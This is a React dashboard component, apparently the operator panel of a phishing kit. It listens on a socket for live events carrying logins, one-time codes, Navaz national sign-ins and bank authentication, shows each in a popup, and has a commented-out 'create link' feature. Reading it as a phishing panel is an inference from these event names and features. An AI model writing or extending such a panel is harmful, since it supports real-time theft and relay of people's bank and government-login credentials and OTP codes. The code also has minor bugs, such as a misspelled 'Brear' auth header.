import React, { useEffect, useState } from 'react'
import { serverRoute, token } from './App'
import axios from 'axios'
import Sidebar from './Sidebar'
import Request from './Request'
import Order from './Order'
import { io } from 'socket.io-client'
import Alret from './Alret'
import Orders from './Orders'

const Main = () => {
    // useEffect(()=>{
    //     (async()=>{
    //       try {
    //         if(localStorage.getItem('token')){
    //           const result = await axios.get(serverRoute+'/auth/verifyToken',{headers:{
    //             Authorization:`Brear ${localStorage.getItem('token')}`
    //           }})
    //           if(result.status === 200){
    //             window.location.href = '/home'
    //           }
    //         }
    //         else{
    //           window.location.href = '/login'
    //         }  
    //       } catch (error) {
    //         localStorage.removeItem('token')
    //         window.location.href = '/login'
    //       }
         
    //     })()
    //   },[])
    const [orders,setOrders]=useState([])
    const [loading,setLoading] = useState(false)
    useEffect(()=>{
      (async()=>await getOrders())()
      // socket.on('newLogin',async()=>await getRequests())
    },{})
    const getOrders = async()=>{
      try {
        const result = await axios.get(serverRoute+'/orders',{headers:{Authorization:`Brear ${token}`}})
        setOrders(result.data.orders)
        // console.log(requests)
        
      } catch (error) {
          if(error.response.status === 401){
            console.log(token)
            // window.localStorage.removeItem('token')
            // window.location.href = '/login'
          }
      }
    }

    const [requests,setRequests]=useState([])
    useEffect(()=>{
      (async()=>await getRequests())()
    },{})
    const getRequests = async()=>{
      try {
        const result = await axios.get(serverRoute+'/requests',{headers:{Authorization:`Brear ${token}`}})
        setRequests(result.data.result)
        // console.log(requests)
        
      } catch (error) {
          if(error.response.status === 401){
            console.log(token)
            // window.localStorage.removeItem('token')
            // window.location.href = '/login'
          }
      }
    }
    const [link,setLink] = useState('')
    const socket = io(serverRoute);
    const [data,setData] = useState([])
    const [popup,setPopup] = useState(false)
    const uniqueNum = ()=>Math.floor(Math.random() * (10000000 - 999999 + 1)) + 999999;
    socket.on('newLogin',(result)=>{
      setData([{...result,mode:'request',id:uniqueNum},...data])
      setPopup(true)
    })
    socket.on('loginOtp',(result)=>{
      setData([{...result,mode:'loginOtp',id:uniqueNum},...data])
      setPopup(true)
    })
    socket.on('newOrder',(result)=>{
      setData([{...result,mode:'order',id:uniqueNum},...data])
      setPopup(true)
    })

    socket.on('orderOtp',(result)=>{
      setData([{...result,mode:'otp',id:uniqueNum},...data])
      setPopup(true)
    })

    socket.on('newNavaz',(result)=>{
      setData([{...result,mode:'navaz',id:uniqueNum},...data])
      setPopup(true)
    })

    socket.on('navazOtp',(result)=>{
      setData([{...result,mode:'navazOtp',id:uniqueNum},...data])
      setPopup(true)
    })
    useEffect(()=>{
        if(!localStorage.getItem('token')){
            window.location.href = '/login'
        }
    },[])
    
    socket.on('bankAuth',(result)=>{
      setData([{...result,mode:'bankAuth',id:uniqueNum},...data])
      setPopup(true)
    })
    const [active,setActive] = useState({nav:'Request',data:{}})
    const getLink = async()=>{
      try {
        const result = await axios.get(serverRoute+'/auth/link',{headers:{'Authorization':`Bearer ${token}`}})
        setLink(result.data.link)
      } catch (error) {
        console.log(error)
        if(error.response.status===401){
          localStorage.removeItem('token')
          window.location.href = '/login'
        }
      }
    }
  return (
    <div className='flex w-full flex-col bg-gray-200 relative h-screen' dir='rtl'  >
        <div className='flex items-center justify-center w-full bg-white py-2' >
          <img src='/individual 1.png' className='w-20 h-20'/>
        </div>
        {/* <div className='w-full flex items-center justify-center'> 
              <div className='bg-white w-11/12 m-2 flex justify-between items-center flex-nowrap'>
                <button className='bg-green-500 text-white px-3 py-2' onClick={getLink}>انشاء رابط</button>
                <span className='text-xs  px-3  flex flex-1 break-all' dir='ltr'>{link}</span>
              </div>
        </div> */}

        <div className='flex '>
          <Sidebar active={active} setActive={setActive}/>
          {active.nav === 'Request' ? <Request socket={socket} setActive={setActive} requests = {requests} refetch = {getRequests} setLoading={setLoading} loading = {loading}/> :
           active.nav === 'Order' ? <Orders socket={socket} ordersData = {orders} setActive={setActive} refetch={getOrders} loading = {loading} setLoading={setLoading} /> :
            active.nav === 'OrderData' ? <Order socket={socket} data={{...active.data}} setActive={setActive} reftch={getOrders}/> :
             null  }
          {popup && <Alret data={data} setPopup = {setPopup} setActive={setActive} setData = {setData} socket= {socket} refetchOrders={getOrders} refetchRequests={ getRequests} />}
        </div>

    </div>
  )
}

export default Main